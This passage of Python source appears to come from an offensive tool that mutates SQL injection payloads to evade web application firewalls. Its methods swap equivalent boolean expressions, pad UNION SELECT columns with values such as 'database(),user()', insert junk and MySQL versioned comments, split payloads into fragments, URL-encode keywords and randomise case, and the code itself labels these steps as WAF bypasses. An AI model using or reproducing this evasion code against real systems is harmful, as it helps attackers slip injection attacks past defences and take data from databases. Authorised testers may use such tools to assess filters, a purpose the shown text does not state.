            r"\bfalse\b": ["1<=>2", "0", "NULL", "(SELECT 0)"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            if re.search(pattern, mutated, flags=re.IGNORECASE):
                mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        """Adds internal comments to fill space logic without breaking payload endpoints."""
        junk = ["bypass", "attack_unit", "audit", "waf_bypass", "X"*8, "1337", "sys"]
        coin = random.random()
        if coin < 0.5 and " " in payload:
            return payload.replace(" ", f"/*{random.choice(junk)}*/", 1)
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _context_aware_mutation(self, payload):
        """(Legacy name kept for strategy matrix) Structural Obfuscation:
           Obfuscates keywords without touching spaces or quotes that handles wrappers.
        """
        mutated = str(payload)
        
        # 1. Comment Wrapping: Wrap keywords or parts of the payload
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.3:
                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)

        return mutated

    def _micro_fragmentation(self, payload):
        """Micro-Fragmentation: Splits the payload into small chunks stuffed with junk data."""
        if len(payload) < 5: return payload
        
        # Split into 3-5 random chunks
        num_chunks = random.randint(3, 6)
        chunk_size = max(1, len(payload) // num_chunks)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        junk_patterns = [
            "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
            "/*!*/", " "
        ]
        
        fragmented = ""
        for i, chunk in enumerate(chunks):
            fragmented += chunk
            if i < len(chunks) - 1:
                fragmented += random.choice(junk_patterns)
        
        return fragmented

    def _single_layer_encoding(self, payload):
        """Single Layer Encoding: Applies at most one pass of URL encoding to keywords."""
        import urllib.parse
        
        def to_url(s):
            return "".join([f"%{ord(c):02x}" for c in s])

        # Only encode keywords or specific parts to avoid breaking SQL syntax entirely
        mutated = payload
        for kw in self.sql_keywords:
            # First check if the keyword is present in its raw form to avoid double encoding `%`
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and random.random() < 0.4:
                # Strictly single URL encoding as per user request
                mutated = re.sub(rf'\b{kw}\b', to_url(kw), mutated, flags=re.IGNORECASE)
                    
        return mutated

    def _dynamic_structural_mutation(self, payload):
        """Dynamic Structural Mutation: Avoids mechanical substitution by generating unique bypass patterns."""
        mutated = payload
        
        # 1. Dynamic Comment Injection (Non-standard patterns)
        def get_dynamic_comment():
            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            content = "".join(random.choices(chars, k=random.randint(2, 5)))
            patterns = [
                f"/**/", 
                f"/*{content}*/", 
                f"/*!{content}*/", 
                f"/*--{content}*/",
                f"/*#*/"
            ]
            return random.choice(patterns)

        # 2. Case Randomization (Bypasses simple regex)
        def randomize_case(word):
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in word])

        # Apply to keywords
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                # Don't just replace, mutate the structure
                options = [
                    lambda k: f"{randomize_case(k)}",
                    lambda k: f"{get_dynamic_comment()}{k}{get_dynamic_comment()}",
                    lambda k: k.replace(" ", get_dynamic_comment()),
                    lambda k: "".join([c + get_dynamic_comment() if random.random() < 0.3 else c for c in k])
                ]
                mutated = re.sub(rf'\b{kw}\b', random.choice(options)(kw), mutated, flags=re.IGNORECASE)
        
        return mutated
